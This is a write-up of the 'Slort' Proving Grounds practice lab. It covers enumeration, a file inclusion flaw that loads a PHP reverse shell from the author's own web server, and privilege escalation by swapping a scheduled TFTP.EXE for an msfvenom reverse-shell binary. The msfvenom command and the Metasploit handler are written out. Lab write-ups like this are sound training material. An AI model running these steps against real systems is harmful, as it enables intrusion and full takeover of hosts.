### Slort Proving Ground Practice

### Difficulty = Intermediate

### IP Address = 

Nmap Scan:

```
└─$ nmap -sCV 192.168.126.53 -p21,135,139,445,3306,4443,5040,7680,8080 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 01:16 WAT
Nmap scan report for 192.168.126.53
Host is up (0.16s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL, X11Probe: 
|_    Host '192.168.49.126' is not allowed to connect to this MariaDB server
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.126.53:4443/dashboard/
5040/tcp open  unknown
7680/tcp open  pando-pub?
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.126.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                    
SF-Port3306-TCP:V=7.92%I=7%D=2/28%Time=63FD47D4%P=x86_64-pc-linux-gnu%r(NU                              
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20al                              
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,                              
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20allow                              
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");                                            
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                
                                                                                                        
Host script results:                                                                                    
| smb2-security-mode:                                                                                   
|   3.1.1:                                                                                              
|_    Message signing enabled but not required                                                          
| smb2-time:                                                                                            
|   date: 2023-02-28T00:18:15                                                                           
|_  start_date: N/A                                                                                     
                                                                                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .          
Nmap done: 1 IP address (1 host up) scanned in 134.11 seconds  
```

From the scan we see that various ports are open

I'll start enumeration from port 21 which is ftp

### FTP Enumeration

Attempting to connect to with anonymously doesn't work

```
└─$ ftp 192.168.126.53
Connected to 192.168.126.53.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.126.53:mark): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 
```

Lets move on 

#### SMB Enumeration

It doesn't allow anonymous listing of shares

```
└─$ smbclient -L 192.168.126.53 
Password for [WORKGROUP\mark]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

#### MYSQl Enumeration

Attempting to login with default cred doesn't work cause we my host ip isn't allowed to connect to the mysql service  

```
└─$ mysql -u root -h 192.168.126.53 -p
Enter password: 
ERROR 1130 (HY000): Host '192.168.49.126' is not allowed to connect to this MariaDB server

```

#### Web Server Enumeration (4443 & 8080)

Heading over to the web page shows the default xampp web page for both port 4443 and 8080
![image](https://user-images.githubusercontent.com/113513376/221719866-ef9aef43-19bb-427e-8340-effa4ffe49e3.png)
![image](https://user-images.githubusercontent.com/113513376/221719802-22fefa7b-32b5-4bad-a6fd-5d87aaf542df.png)

When i tried accessing phpmyadmin i get an error
![image](https://user-images.githubusercontent.com/113513376/221720508-2b38f8bd-3889-4a7f-9c14-baf4f93ab5b6.png)

But on checking phpinfo it works 
![image](https://user-images.githubusercontent.com/113513376/221720573-47ba24af-6125-4399-80d5-afd76058c5e1.png)

Reading it shows it allows urlfopen meaning we can include remote files 
![image](https://user-images.githubusercontent.com/113513376/221720644-5a8639a2-47c0-4933-9bd1-d42ae39f3e56.png)

We also know know that there's a user on the box called rupert
![image](https://user-images.githubusercontent.com/113513376/221720821-7c5b9862-3e76-4387-80c4-96b05cd1ba12.png)

I'll run gobuster on each of the web service running on both ports
![image](https://user-images.githubusercontent.com/113513376/221721532-057a479e-60de-40a2-9e0e-bda01237398c.png)
![image](https://user-images.githubusercontent.com/113513376/221721592-f94382fe-9d8e-438f-b314-30870026642e.png)

Looking at the url it shows that its including the main.php file

So this is a local file inclusion vulnerability 

We can confirm by reading the windows /etc/hosts file located at `C:\windows\system32\drivers\etc\hosts`
![image](https://user-images.githubusercontent.com/113513376/221722344-39692f4c-6ff6-4fdd-875c-0618255c41a3.png)
![image](https://user-images.githubusercontent.com/113513376/221722392-47251b32-2aed-4b78-95b6-84932e8630b8.png)

If you remember from reading the phpinfo file we know that urlfopen is enabled 

With this we can include remote files via the LFI

#### Exploitation

First i'll save a php reverse shell gotten from [revshells](https://www.revshells.com/)

Then after that i'll set a listener on port 8080 and a web server on port 80
![image](https://user-images.githubusercontent.com/113513376/221723291-a28baf70-2f98-406c-8580-c5b973b44d2c.png)

Now i can include the shell.php on the web server which will then be executed
![image](https://user-images.githubusercontent.com/113513376/221723578-b4b0a2a8-e176-4df1-9859-a3ae8ae422bc.png)

Back on the listener i get a connection back
![image](https://user-images.githubusercontent.com/113513376/221723627-3790cb3a-e003-48ef-bc8b-06c24f82836c.png)

Now lets get root 

Checking the C:\ directory shows a backup directory
![image](https://user-images.githubusercontent.com/113513376/221724049-5b6ee9c3-2498-4d17-a1a3-80b638fdbb02.png)

And what the info.txt says is that there will be a cron which will run every 5 minutes

```
C:\Backup>more info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

C:\Backup>
```

On checking the permission we have over that directory shows that we have full access 

```
C:\Backup>icacls .
. BUILTIN\Users:(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  NT AUTHORITY\Authenticated Users:(I)(M)
  NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\Backup>
```

Now lets replace the TFTP.exe to a reverse shell binary

Using msfvenom i'll create the binary (I'm having issue with msfvenom if i don't use bundler exec to run it xD)

```
Payload: msfvenom -p windows/x64/reverse_tcp LHOST=tun0 LPORT=4443 -f exe -o TFTP.exe
```

After that i will then upload it to the target and replace it with the orginal TFTP binary and wait for the reverse shell
![image](https://user-images.githubusercontent.com/113513376/221725185-ba7e9ed1-d354-45ba-9b21-61f8b713ed2d.png)

I will use metasploit to receive the shell

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Slort]
└─$ cat payload.rc  
use multi/handler
set payload windows/meterpreter/reverse_tcp 
set lhost tun0
set lport 4443
exploit

                                                                                                                         
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Slort]
└─$ msfconsole -r payload.rc
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP                                               
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                                
                                                                                                                         
                                                                    .                                                    
                .                                                                                                        
        o                  To boldly go where no                                                                         
                            shell has gone before                                                                        
                                                                                                                         

       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true

[*] Processing payload.rc for ERB directives.
resource (payload.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (payload.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (payload.rc)> set lhost tun0
lhost => tun0
resource (payload.rc)> set lport 4443
lport => 4443
resource (payload.rc)> exploit
[*] Started reverse TCP handler on 192.168.49.126:4443 
```

But i waited and notice it isn't working 

Likely cause of firewall outbound connection on the port i used

So i redid the same process again but this time used port 8080 and after replacing the binary back it worked
![image](https://user-images.githubusercontent.com/113513376/221727216-98d549dc-b943-4ca1-a23f-953d22980fbd.png)

And we're done
<br> <br>
[Back To Home](../../index.md)

